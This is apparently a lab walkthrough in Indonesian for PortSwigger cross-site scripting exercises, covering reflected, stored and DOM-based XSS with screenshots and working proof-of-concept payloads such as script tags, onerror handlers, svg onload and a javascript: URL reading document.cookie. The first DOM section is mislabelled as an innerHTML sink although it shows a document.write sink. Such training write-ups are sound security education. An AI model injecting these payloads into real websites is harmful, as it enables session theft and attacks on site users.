# Cross-site scripting (XSS)

## Reflected XSS into HTML context with nothing encoded
- Celah keamanan XSS berada di fitur pencarian (Search)

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/assets/xss%201.JPG)

- Masukkan payload berikut pada field pencarian lalu tekan tombol **Search**
```sh
<script>alert(1)</script>
```

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/assets/xss%202.JPG)

- Muncul pop up yang menjadi penanda kerentanan XSS

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/assets/xss%203.JPG)

- Selain payload diatas kita juga bisa menggunakan payload lain seperti dibawah ini
```sh
<img src=x onerror="alert(1)">
```

## Stored XSS into HTML context with nothing encoded
- Celah keamanan XSS berada di fitur komentar. Pilih salah satu postingan lalu tekan tombol **View post**

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/assets/xss%204.JPG)

- Scroll kebawah, lalu masukkan payload XSS pada field **Comment** kemudian lengkapi data pada field lainnya seperti berikut ini, Jika sudah tekan tombol **Post Comment**
```sh
<script>alert(1)</script>
```

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/assets/xss%205.JPG)

- Lalu klik link **Back to blog**

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/assets/xss%206.JPG)

- Muncul pop up yang menjadi penanda kerentanan XSS

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/assets/xss%207.JPG)

## DOM XSS in innerHTML sink using source location.search
- Celah keamanan XSS berada di fitur pencarian (Search)

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/assets/xss%208.JPG)

- Ketik 'test' pada field pencarian lalu tekan tombol **Search**

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/assets/xss%209.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/assets/xss%2010.JPG)

- Klik kanan kemudian pilih **Lihat Kode Sumber Halaman**

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/assets/xss%2011.jpg)

- Akan ditemukan function javascript sebagai berikut

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/assets/xss%2012.JPG)

- Masukkan payload berikut ini pada filed pencarian, untuk memunculkan popup alert
```sh
"><svg onload=alert(1)>
```

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/assets/xss%2013.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/assets/xss%2014.JPG)

- Selain payload diatas anda juga bisa menggunakan payload sebagai berikut
```sh
"><img src/onerror=alert(1)>
```

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/assets/xss%2015.JPG)

- Payload diatas akan membentuk nilai sebagai berikut, sehingga menyebabkan kerentanan XSS
```sh
document.write('<img src="/resources/images/tracker.gif?searchTerms="><svg onload=alert(1)>">');
```

## DOM XSS in innerHTML sink using source location.search
- Celah keamanan XSS berada di fitur pencarian (Search)

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/assets/xss%2016.JPG)

- Ketik 'test' pada field pencarian lalu tekan tombol **Search**

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/assets/xss%2017.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/assets/xss%2018.JPG)

- Klik kanan kemudian pilih **Lihat Kode Sumber Halaman**

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/assets/xss%2019.jpg)

- Akan ditemukan function javascript sebagai berikut

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/assets/xss%2020.JPG)

- Masukkan payload berikut ini pada filed pencarian, untuk memunculkan popup alert
```sh
<img src=1 onerror=alert(1)>
```

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/assets/xss%2021.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/assets/xss%2022.JPG)

- Selain payload diatas anda juga bisa menggunakan payload sebagai berikut
```sh
<iframe src="javascript:alert('xss')">
```

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/assets/xss%2023.JPG)

- Payload diatas akan menambahkan HTML pada element `span` seperti berikut
```sh
<span id="searchMessage"><img src="1" onerror="alert(1)"></span>
```

## DOM XSS in jQuery anchor href attribute sink using location.search source
- Celah keamanan berada di halaman **Feedback**. Tekan tombol **View Post**

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/assets/xss%2024.JPG)

- Klik link **Submit feedback**

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/assets/xss%2025.JPG)

- Pada URL akan tampak parameter **returnPath**

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/assets/xss%2026.JPG)

- Klik kanan kemudian pilih **Lihat Kode Sumber Halaman**

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/assets/xss%2027.jpg)

- Akan ditemukan function javascript sebagai berikut

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/assets/xss%2028.JPG)

- Masukkan payload berikut ini pada nilai parameter **returnPath** kemudian tekan enter
```sh
javascript:alert(document.cookie)
```

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/assets/xss%2029.JPG)

- Jika kita melakukan inspeksi pada Back link akan tampak HTML sebagai berikut
```sh
<a id="backLink" href="javascript:alert(document.cookie)">Back</a>
```
- Jika kita klik link tersebut akan muncul popup

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/assets/xss%2030.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/portswigger-labs/blob/main/XSS/assets/xss%2031.JPG)